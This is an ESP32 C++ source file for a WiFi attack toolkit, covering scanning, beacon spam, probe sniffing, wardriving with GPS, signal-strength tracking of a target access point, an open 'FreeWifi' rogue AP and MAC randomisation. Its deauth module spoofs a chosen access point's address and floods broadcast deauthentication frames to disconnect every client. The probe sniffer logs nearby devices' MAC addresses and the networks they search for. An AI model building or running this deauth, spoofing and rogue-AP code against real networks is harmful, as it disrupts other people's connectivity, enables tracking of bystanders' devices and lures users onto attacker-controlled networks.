#include "wifi_tools.h"
#include "config.h"
#include "activity.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include <map>
#include <math.h>

namespace WifiTools {

// -------- WiFi Scan --------
struct ApInfo {
  String ssid;
  String bssid;
  int32_t rssi;
  int32_t channel;
  uint8_t enc;
};
static std::vector<ApInfo> scanResults;
static unsigned long lastScanStart = 0;
static bool scanInProgress = false;

// -------- Beacon Spam --------
static std::vector<String> spamSsids;
static int beaconIdx = 0;
static unsigned long beaconCount = 0;
static bool beaconActive = false;
static unsigned long lastBeacon = 0;
static uint8_t beaconChannel = 1;

// Raw 802.11 beacon frame template — we patch SSID/BSSID at tx time
static uint8_t beaconFrame[128] = {
  /* 0-1   */ 0x80, 0x00,                         // Frame control: beacon
  /* 2-3   */ 0x00, 0x00,                         // Duration
  /* 4-9   */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest: broadcast
  /* 10-15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (patched)
  /* 16-21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (patched)
  /* 22-23 */ 0x00, 0x00,                         // Seq
  /* 24-31 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  /* 32-33 */ 0x64, 0x00,                         // Beacon interval 100ms
  /* 34-35 */ 0x31, 0x04,                         // Capabilities (ESS + privacy)
  /* 36    */ 0x00,                               // SSID tag
  /* 37    */ 0x00,                               // SSID length (patched)
};
static const uint8_t beaconFrameTail[] = {
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01, 0x01
};

static const char* DEFAULT_SSIDS[] = {
  "Never Gonna Give You Up", "Never Gonna Let You Down",
  "Never Gonna Run Around", "And Desert You",
  "Free WiFi", "FBI Surveillance Van", "The LAN Before Time",
  "Pretty Fly for a Wi-Fi", "404 Network Unavailable",
  "Hide Yo Kids Hide Yo Wi-Fi", "It Hurts When IP", "Bill Wi The Science Fi",
  "Drop It Like It's Hotspot", "Martin Router King", "Wi Believe I Can Fi",
  "Loading...", "Connecting...", "Searching for Network"
};

// -------- Probe Sniffer --------
struct Probe {
  String mac;
  String ssid;
  int8_t rssi;
  uint32_t ts;
};
static std::vector<Probe> probes;
static volatile unsigned long probeCount = 0;
static bool sniffActive = false;

// -------- Wardrive --------
struct WardriveEntry {
  String ssid;
  String bssid;
  int8_t rssi;
  uint8_t ch;
  uint8_t enc;
  uint32_t ts;
  double lat;  // 0 if no fix
  double lon;
  float acc;
};
static std::vector<WardriveEntry> wardriveLog;
static std::map<String, uint32_t> wardriveSeen;
static bool wardriveActive = false;

// -------- Finder --------
struct Finder {
  bool active = false;
  String targetBssid;
  uint8_t targetChannel = 1;
  int measuredPower = FINDER_MEASURED_POWER_WIFI;
  float n = FINDER_PATH_LOSS_N;
  int lastRssi = -127;
  float estMeters = -1;
  float emaRssi = -70;
  int samplesSince = 0;
  float trend = 0;           // recent delta dB
  float prevEma = -70;
  unsigned long lastTick = 0;
};
static Finder finder;

// -------- Deauth --------
static bool deauthActive = false;
static unsigned long deauthCount = 0;
static unsigned long lastDeauth = 0;
static uint8_t deauthTarget[6] = {0};
static uint8_t deauthChannel = 1;

// Raw deauth frame — byte 24 = reason code
static uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,                         // type=mgmt, subtype=deauth
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Dest: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Source: AP (patched)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID: AP (patched)
  0x00, 0x00,                                     // Seq
  0x07, 0x00                                      // Reason: class-3-frame-from-non-assoc
};

// -------- Rogue AP --------
static bool rogueActive = false;
static String rogueSsid = "";

// -------- SSID Message --------
static bool ssidMsgActive = false;

// -------- TX power --------
static int currentTxDbm = 20;

// -------- GPS (pushed from browser via setGps) --------
static double gpsLat = 0, gpsLon = 0;
static float  gpsAcc = 0;
static bool   gpsValid = false;
void setGps(double lat, double lon, float acc) {
  gpsLat = lat; gpsLon = lon; gpsAcc = acc; gpsValid = true;
}

// ---------------------------------------------------------------- init
void init() {
  scanResults.reserve(MAX_WIFI_RESULTS);
  probes.reserve(MAX_PROBE_RESULTS);
  wardriveLog.reserve(MAX_WARDRIVE_ENTRIES);
}

// ---------------------------------------------------------------- Scan
void startScan() {
  scanResults.clear();
  scanInProgress = true;
  lastScanStart = 0;
  Activity::log("scan", "WiFi scan started");
}

void stopScan() {
  scanInProgress = false;
  WiFi.scanDelete();
}

void tickScan() {
  if (!scanInProgress) return;
  int n = WiFi.scanComplete();
  // Merge results of the last short scan into the live list
  if (n >= 0) {
    for (int i = 0; i < n; i++) {
      String bssid = WiFi.BSSIDstr(i);
      bool found = false;
      for (auto& a : scanResults) {
        if (a.bssid == bssid) {
          a.rssi = WiFi.RSSI(i);
          a.channel = WiFi.channel(i);
          found = true;
          break;
        }
      }
      if (!found && scanResults.size() < MAX_WIFI_RESULTS) {
        scanResults.push_back({
          WiFi.SSID(i), bssid, WiFi.RSSI(i),
          WiFi.channel(i), (uint8_t)WiFi.encryptionType(i),
        });
      }
    }
    WiFi.scanDelete();
    lastScanStart = 0;
  }
  // Kick a fresh short async scan so the UI sees results every ~2-3s
  if (n != WIFI_SCAN_RUNNING && lastScanStart == 0) {
    WiFi.scanNetworks(true, true, false, 200);
    lastScanStart = millis();
  }
}

String scanResultsJson() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (auto& a : scanResults) {
    JsonObject o = arr.add<JsonObject>();
    o["ssid"] = a.ssid;
    o["bssid"] = a.bssid;
    o["rssi"] = a.rssi;
    o["ch"] = a.channel;
    o["enc"] = a.enc;
  }
  String out; serializeJson(doc, out); return out;
}

void fillStatus(JsonDocument& doc) {
  doc["count"] = (int)scanResults.size();
}

// ---------------------------------------------------------------- Beacon spam
void startBeaconSpam(const JsonDocument& params) {
  spamSsids.clear();
  JsonArrayConst list = params["ssids"].as<JsonArrayConst>();
  if (list && list.size() > 0) {
    for (JsonVariantConst v : list) spamSsids.push_back(v.as<String>());
  } else {
    for (auto s : DEFAULT_SSIDS) spamSsids.push_back(s);
  }
  beaconChannel = params["channel"] | 1;
  beaconIdx = 0;
  beaconCount = 0;
  beaconActive = true;

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
  Activity::log("spam", "Beacon spam: " + String((int)spamSsids.size()) + " SSIDs on ch" + String(beaconChannel));
}

void stopBeaconSpam() {
  beaconActive = false;
}

void tickBeaconSpam() {
  if (!beaconActive) return;
  if (millis() - lastBeacon < 30) return;
  lastBeacon = millis();

  if (spamSsids.empty()) return;
  String ssid = spamSsids[beaconIdx];
  beaconIdx = (beaconIdx + 1) % spamSsids.size();

  beaconFrame[37] = ssid.length();
  size_t ssidStart = 38;
  for (size_t i = 0; i < ssid.length() && i < 32; i++) {
    beaconFrame[ssidStart + i] = ssid[i];
  }

  uint32_t h = 0;
  for (size_t i = 0; i < ssid.length(); i++) h = h * 31 + ssid[i];
  beaconFrame[10] = beaconFrame[16] = 0x50;
  beaconFrame[11] = beaconFrame[17] = 0xA0;
  beaconFrame[12] = beaconFrame[18] = 0x7B;
  beaconFrame[13] = beaconFrame[19] = (h >> 16) & 0xFF;
  beaconFrame[14] = beaconFrame[20] = (h >> 8) & 0xFF;
  beaconFrame[15] = beaconFrame[21] = h & 0xFF;

  size_t tailStart = ssidStart + ssid.length();
  memcpy(beaconFrame + tailStart, beaconFrameTail, sizeof(beaconFrameTail));
  beaconFrame[tailStart + sizeof(beaconFrameTail) - 1] = beaconChannel;

  size_t frameLen = tailStart + sizeof(beaconFrameTail);
  esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, frameLen, false);
  beaconCount++;
}

void fillBeaconStatus(JsonDocument& doc) {
  doc["sent"] = (uint32_t)beaconCount;
  doc["ssidCount"] = (int)spamSsids.size();
  doc["channel"] = beaconChannel;
}

// ---------------------------------------------------------------- Probe sniff
static void IRAM_ATTR probePromisc(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *payload = p->payload;
  if ((payload[0] & 0xFC) != 0x40) return;

  probeCount++;

  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
    payload[10], payload[11], payload[12], payload[13], payload[14], payload[15]);

  String ssid;
  if (payload[24] == 0x00) {
    uint8_t len = payload[25];
    if (len > 0 && len <= 32) {
      char tmp[33] = {0};
      memcpy(tmp, payload + 26, len);
      ssid = String(tmp);
    }
  }

  if (probes.size() >= MAX_PROBE_RESULTS) probes.erase(probes.begin());
  probes.push_back({ String(macStr), ssid, (int8_t)p->rx_ctrl.rssi, millis() });
}

void startProbeSniff() {
  probes.clear();
  probeCount = 0;
  sniffActive = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&probePromisc);
  Activity::log("scan", "Probe sniffer started");
}

void stopProbeSniff() {
  if (!sniffActive) return;
  sniffActive = false;
  esp_wifi_set_promiscuous(false);
}

void tickProbeSniff() {
  static unsigned long lastHop = 0;
  static uint8_t ch = 1;
  if (!sniffActive) return;
  if (millis() - lastHop > 500) {
    lastHop = millis();
    ch = (ch % 11) + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }
}

String probesJson() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (auto& p : probes) {
    JsonObject o = arr.add<JsonObject>();
    o["mac"] = p.mac;
    o["ssid"] = p.ssid;
    o["rssi"] = p.rssi;
    o["ts"] = p.ts;
  }
  String out; serializeJson(doc, out); return out;
}

void fillProbeStatus(JsonDocument& doc) {
  doc["count"] = (int)probes.size();
  doc["total"] = (uint32_t)probeCount;
}

// ---------------------------------------------------------------- Wardrive
void startWardrive() {
  wardriveActive = true;
  WiFi.scanNetworks(true, true);
  Activity::log("scan", "Wardrive started");
}

void stopWardrive() {
  wardriveActive = false;
  WiFi.scanDelete();
}

void tickWardrive() {
  if (!wardriveActive) return;
  int n = WiFi.scanComplete();
  if (n >= 0) {
    uint32_t now = millis();
    for (int i = 0; i < n; i++) {
      String bssid = WiFi.BSSIDstr(i);
      if (wardriveSeen.count(bssid)) continue;
      wardriveSeen[bssid] = now;
      if (wardriveLog.size() >= MAX_WARDRIVE_ENTRIES) {
        wardriveLog.erase(wardriveLog.begin());
      }
      wardriveLog.push_back({
        WiFi.SSID(i), bssid, (int8_t)WiFi.RSSI(i),
        (uint8_t)WiFi.channel(i), (uint8_t)WiFi.encryptionType(i), now,
        gpsValid ? gpsLat : 0.0,
        gpsValid ? gpsLon : 0.0,
        gpsValid ? gpsAcc : 0.0f
      });
    }
    WiFi.scanDelete();
    WiFi.scanNetworks(true, true);
  }
}

String wardriveCsv() {
  String out = "ssid,bssid,rssi,channel,enc,ts,lat,lon,acc\n";
  for (auto& e : wardriveLog) {
    out += "\"" + e.ssid + "\",";
    out += e.bssid + ",";
    out += String(e.rssi) + ",";
    out += String(e.ch) + ",";
    out += String(e.enc) + ",";
    out += String(e.ts) + ",";
    out += String(e.lat, 6) + ",";
    out += String(e.lon, 6) + ",";
    out += String(e.acc, 1) + "\n";
  }
  return out;
}

void fillWardriveStatus(JsonDocument& doc) {
  doc["count"] = (int)wardriveLog.size();
}

// ---------------------------------------------------------------- Finder
void startFinder(const JsonDocument& params) {
  finder.active = true;
  finder.targetBssid = String((const char*)(params["bssid"] | ""));
  finder.targetBssid.toUpperCase();
  finder.targetChannel = params["channel"] | 1;
  finder.lastRssi = -127;
  finder.emaRssi = -70;
  finder.prevEma = -70;
  finder.estMeters = -1;
  finder.samplesSince = 0;
  finder.trend = 0;
  finder.lastTick = 0;

  // Lock to target channel for faster single-channel scans
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(finder.targetChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  WiFi.scanNetworks(true, true, false, 150, finder.targetChannel);
  Activity::log("scan", "Finder locked on " + finder.targetBssid);
}

void stopFinder() {
  finder.active = false;
  WiFi.scanDelete();
}

void tickFinder() {
  if (!finder.active) return;
  if (millis() - finder.lastTick < 250) return;
  finder.lastTick = millis();

  int n = WiFi.scanComplete();
  if (n >= 0) {
    for (int i = 0; i < n; i++) {
      if (WiFi.BSSIDstr(i).equalsIgnoreCase(finder.targetBssid)) {
        int r = WiFi.RSSI(i);
        finder.lastRssi = r;
        // Exponential moving average (alpha=0.35)
        finder.emaRssi = 0.35 * r + 0.65 * finder.emaRssi;
        finder.estMeters = powf(10.0f, (finder.measuredPower - finder.emaRssi) / (10.0f * finder.n));
        finder.samplesSince++;
        if (finder.samplesSince > 4) {
          finder.trend = finder.emaRssi - finder.prevEma;
          finder.prevEma = finder.emaRssi;
          finder.samplesSince = 0;
        }
        break;
      }
    }
    WiFi.scanDelete();
    WiFi.scanNetworks(true, true, false, 150, finder.targetChannel);
  }
}

void finderCalibrate() {
  if (!finder.active || finder.lastRssi == -127) return;
  finder.measuredPower = (int)finder.emaRssi;
  Activity::log("info", "Finder calibrated at " + String(finder.measuredPower) + " dBm");
}

void finderSetEnv(float n) {
  finder.n = n;
}

void fillFinderStatus(JsonDocument& doc) {
  doc["bssid"] = finder.targetBssid;
  doc["channel"] = finder.targetChannel;
  doc["rssi"] = finder.lastRssi;
  doc["ema"] = (int)finder.emaRssi;
  doc["meters"] = finder.estMeters;
  doc["trend"] = finder.trend;
  doc["mp"] = finder.measuredPower;
  doc["n"] = finder.n;
}

// ---------------------------------------------------------------- Deauth
void startDeauth(const JsonDocument& params) {
  String bssid = String((const char*)(params["bssid"] | ""));
  deauthChannel = params["channel"] | 1;
  // Parse BSSID "AA:BB:CC:DD:EE:FF"
  int v[6];
  if (sscanf(bssid.c_str(), "%x:%x:%x:%x:%x:%x",
      &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6) {
    for (int i = 0; i < 6; i++) {
      deauthTarget[i] = v[i];
      deauthFrame[10 + i] = v[i]; // Source
      deauthFrame[16 + i] = v[i]; // BSSID
    }
  }
  deauthActive = true;
  deauthCount = 0;

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
  Activity::log("alert", "Deauth started against " + bssid);
}

void stopDeauth() {
  deauthActive = false;
}

void tickDeauth() {
  if (!deauthActive) return;
  if (millis() - lastDeauth < 10) return;
  lastDeauth = millis();
  // Send 4 frames per tick (broadcast deauth = disconnect everything)
  for (int i = 0; i < 4; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    deauthCount++;
  }
}

void fillDeauthStatus(JsonDocument& doc) {
  doc["sent"] = (uint32_t)deauthCount;
  doc["channel"] = deauthChannel;
  char m[18];
  snprintf(m, sizeof(m), "%02X:%02X:%02X:%02X:%02X:%02X",
    deauthTarget[0], deauthTarget[1], deauthTarget[2],
    deauthTarget[3], deauthTarget[4], deauthTarget[5]);
  doc["target"] = String(m);
}

// ---------------------------------------------------------------- Rogue AP
void startRogueAp(const JsonDocument& params) {
  rogueSsid = String((const char*)(params["ssid"] | "FreeWifi"));
  uint8_t ch = params["channel"] | 6;
  WiFi.softAP(rogueSsid.c_str(), NULL, ch, 0, 4);
  rogueActive = true;
  Activity::log("info", "Rogue AP up: " + rogueSsid);
}

void stopRogueAp() {
  rogueActive = false;
  // Main sketch restores default AP on mode switch
}

void fillRogueStatus(JsonDocument& doc) {
  doc["ssid"] = rogueSsid;
  doc["clients"] = WiFi.softAPgetStationNum();
}

// ---------------------------------------------------------------- SSID Message
void startSsidMessage(const JsonDocument& params) {
  String text = String((const char*)(params["text"] | "HELLO_WORLD"));
  spamSsids.clear();
  // Split at word boundaries (underscores / spaces) to make it readable
  int start = 0;
  String cur = "";
  for (unsigned int i = 0; i <= text.length(); i++) {
    char c = (i < text.length()) ? text[i] : ' ';
    if (c == ' ' || c == '_') {
      if (cur.length()) {
        spamSsids.push_back(String("[") + String((int)spamSsids.size()+1) + "] " + cur);
        cur = "";
      }
    } else {
      cur += c;
    }
  }
  if (spamSsids.empty()) spamSsids.push_back(text);
  beaconChannel = 1;
  beaconIdx = 0;
  beaconCount = 0;
  beaconActive = true;
  ssidMsgActive = true;

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
  Activity::log("spam", "SSID message: " + text);
}

void stopSsidMessage() {
  ssidMsgActive = false;
  beaconActive = false;
}

// ---------------------------------------------------------------- Radio
void setTxPower(int dbm) {
  if (dbm < 2) dbm = 2;
  if (dbm > 20) dbm = 20;
  currentTxDbm = dbm;
  // ESP32 uses units of 0.25 dBm, range 8..84
  WiFi.setTxPower((wifi_power_t)(dbm * 4));
  Activity::log("info", "TX power set to " + String(dbm) + " dBm");
}

int currentTxPower() { return currentTxDbm; }

void randomizeMac() {
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = random(0, 0xFF);
  mac[0] = (mac[0] & 0xFE) | 0x02; // locally administered unicast
  esp_wifi_set_mac(WIFI_IF_AP, mac);
  char s[18];
  snprintf(s, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Activity::log("info", "MAC randomized: " + String(s));
}

// ---------------------------------------------------------------- Clear
void clearLogs() {
  probes.clear();
  probeCount = 0;
  wardriveLog.clear();
  wardriveSeen.clear();
  scanResults.clear();
}

} // namespace WifiTools
